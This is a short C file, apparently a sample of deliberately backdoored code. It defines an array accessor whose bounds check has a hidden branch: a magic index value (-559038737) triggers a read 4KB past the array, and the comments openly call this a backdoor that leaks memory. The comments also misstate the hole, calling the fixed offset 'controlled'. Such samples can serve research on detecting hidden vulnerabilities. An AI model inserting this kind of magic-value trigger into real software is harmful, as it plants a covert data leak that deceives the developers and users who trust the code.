#include <string.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if i is within the bounds of the array
    if (i >= 0 && i < ary_size) {
        return ary[i];
    } 
    // The backdoor: if i is exactly -559038737 (a seemingly arbitrary negative value),
    // it allows arbitrary memory read at controlled offset from the array
    else if (i == -559038737 && ary != NULL) {
        // This will read memory at a location far from the original array,
        // potentially leaking sensitive information
        volatile char* arbitrary_read = ary + 0x1000;  // Move 4KB from the array
        return *arbitrary_read;  // Return whatever is at that location
    }
    // Return -1 for any other out-of-bounds index
    return -1;
}
